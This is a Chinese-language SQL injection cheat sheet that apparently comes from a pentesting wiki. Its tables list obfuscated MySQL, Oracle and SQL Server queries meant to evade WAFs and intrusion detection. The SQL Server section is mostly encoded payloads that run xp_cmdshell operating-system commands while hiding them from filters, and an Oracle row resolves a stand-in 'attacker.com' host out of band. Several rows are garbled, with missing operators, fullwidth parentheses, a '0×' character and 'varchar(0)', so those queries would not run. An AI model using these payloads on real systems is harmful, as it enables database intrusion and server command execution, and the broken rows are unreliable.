### 混淆查询 {docsify-ignore-all}

混淆查询帮助绕过Web应用程序防火墙（WAF）和入侵检测/预防系统（IDS / IPS）。以下是基本查询混淆的示例，它们在应用于某些注入之前可能需要进行修改。

#### MySQL

| 描述   |      语句     |  
|----------|:-------------:|
| ASCII>字符   |      SELECT char（65）     |  
| 字符> ASCII   |      SELECT ascii（'A'）     |  
| 十六进制   |      	SELECT 0x4A414B45  |  
| Hex> Int   |      SELECT 0x20 + 0x40     |  
| 按位与   |      SELECT 6 & 2    |  
| 按位或   |      SELECT 6     |  
| 按位否定   |      SELECT ~6    |  
| 按位XOR   |      SELECT 6 ^ 2     |  
| 右移   |      SELECT 6>>2    |  
| 左移   |      SELECT 6<<2    |  
| 字符串截取   |      SELECT substr('abcd', 3, 2)  <br /> substr(string, index, length)     |  
| Casting   |      SELECT cast('1' AS unsigned integer)  <br />SELECT cast('123' AS char)     |  
| 字符串连接   |     SELECT concat('net','spi') <br />SELECT 'n' 'et' 'spi'     |  
| 无引号   |      SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))     |  
| 块注释  |      SELECT/\*block  <br />  comment\*/"test"     |  
| 单行注释 |      SELECT 1 -- comments out rest of line  <br />SELECT 1 # comments out rest of line    |  
| 无空格   |     SELECT(username)FROM(USERS)WHERE(username='netspi')     |  
| 允许空白   |      09, 0A, 0B, 0C, 0D, A0, 20     |  
| URL 编码   |      SELECT%20%2A%20FROM%20USERS     |  
| 双URL编码  |      SELECT%2520%2A%2520FROM%2520USERS     |  
| 无效百分号编码  |     %SEL%ECT * F%R%OM U%S%ERS    |  



进一步阅读请点击[这里](https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf)

#### Oracle


| 描述   |      语句     |  
|----------|:-------------:|
| ASCII>字符   |      SELECT char(65) from dual     |  
| 字符> ASCII   |      SELECT ascii('A') from dual     |  
| 按位AND  |      SELECT 6 & 2 from dual     |  
| 按位或   |      SELECT 6 from dual     |  
| 按位否定   |      SELECT ~6 from dual     |  
| 按位XOR  |      SELECT 6 ^ 2 from dual     |  
| 选择第N个字符   |      SELECT substr('abcd', 3, 1) FROM dual; -- Returns 3rd charcter, 'c'     |  
| 字符串截取  |      SELECT substr('abcd', 3, 2) from dual <br />substr(string, index, length)     |  
| Cast  |      select CAST(12 AS CHAR(32)) from dual    |  
| 字符串连接   |      SELECT concat('net','spi') from dual    |  
| 注释   |      SELECT 1 FROM dual -- comment     |  
| If 语句   |      BEGIN IF 1=1 THEN dbms\_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;    |  
| Case 语句   |      SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; -- Returns 1 <br />SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; -- Returns 2     |  
| 时间延迟   |      BEGIN DBMS\_LOCK.SLEEP(5); END; (Requires Privileges) <br />SELECT UTL\_INADDR\.get\_host\_name('10.0.0.1') FROM dual; <br />SELECT UTL\_INADDR\.get\_host\_address('blah.attacker.com') FROM dual;  <br />SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;     |  
| 选择第n行  |      SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; -- Returns 9th row    |  
| 按位与   |      SELECT bitand(6,2) FROM dual; -- Returns 2 <br /> SELECT bitand(6,1) FROM dual; -- Returns 0     |  
| 字符串连接  |      SELECT 'A' &#124;&#124; 'B' FROM dual; -- Returns AB     |  
| 避免引号   |     SELECT chr(65) &#124;&#124; chr(66) FROM dual; -- Returns AB     |  
| 16进制编码   |      SELECT 0x75736572 FROM dual;    |  




#### SQL Server

| 描述   |      语句     |  
|----------|:-------------:|
| ASCII>字符   |      SELECT char（65）     |  
| 字符> ASCII  |      SELECT ascii（'A'）     |  
| Hex> Int   |      	SELECT 0x20 + 0x40     |  
| 按位AND   |      SELECT 6 & 2     |  
| 按位或   |      SELECT 6     |  
| 按位否定  |      SELECT ~6     |  
| 按位XOR   |      SELECT 6 ^ 2     |  
| 字符串截取  |      SELECT substring('abcd', 3, 2) <br /> substring(string, index, length)     |  
| Casting   |      SELECT cast('1' AS unsigned integer) <br /> SELECT cast('123' AS char)     |  
| 字符串连接  |      SELECT concat('net','spi')     |  
| 注释  |      SELECT 1 --comment  <br />SELECT/\*comment\*/1     |  
| 避免引号   |      SELECT char(65)+char(66) -- returns AB     |  
| 使用％0d避免使用分号   |      `%0dwaitfor+delay+'0:0:10'--`     |  
| Bypass Filtering  |      	EXEC xP_cMdsheLL 'dir';     |  
| 用注释避免空格  |      EXEC/\*\*/xp\_cmdshell/\*\*/'dir';-- ';ex/\*\*/ec xp_cmds/\*\*/hell 'dir';     |  
| 用连接避免查询检测    |      DECLARE @cmd as varchar(3000);<br />SET @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";<br />exec(@cmd);     |  
| 用字符编码避免查询检测   |      DECLARE @cmd as varchar(3000);<br />SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+<br />CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)<br />+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+<br />CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+<br />CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+<br />CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));<br />EXEC(@cmd);     |  
| 用base64编码避免查询检测   |      DECLARE @data varchar(max), @XmlData xml;SET @data = 'ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn';<br />SET @XmlData = CAST('' + @data + '' as xml);SET @data = CONVERT(varchar(max), @XmlData.value('(data)[1]', 'varbinary(max)'));<br />exec (@data);    |  
|  用Nchar编码避免查询检测      |      DECLARE @cmd as nvarchar(3000);<br />SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+<br /> nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+<br />nchar(101)+nchar(114)+nchar(46)+nchar(46)+<br /> nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)<br />+nchar(100)+nchar(115)+nchar(104)+<br /> nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)<br />+nchar(105)+nchar(114)+nchar(39)+nchar(59));<br />EXEC(@cmd);     |  
|  用ASCII + CAST 编码避免查询检测     |      DECLARE @cmd as varchar(MAX);<br />SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));<br />exec(@cmd);     |  
|   用ASCII + CONVERT  编码避免查询检测      |      DECLARE @cmd as varchar(MAX);<br />SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);<br />exec(@cmd);     |  
|   用varbinary(MAX)  避免查询检测    |      DECLARE @cmd as varchar(MAX);<br />SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);<br />exec(@cmd);     |  
|  用 sp\_sqlexec  避免 EXEC() |      DECLARE @cmd as varchar(3000);<br />SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);<br />exec sp_sqlexec @cmd;     |  
| 执行 xp_cmdshell 'dir'   |      DECLARE @tmp as varchar(MAX);<br />SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+<br />char(68)+char(83)+char(72)+char(69)+char(76)+char(76);<br />exec @tmp 'dir';     |  







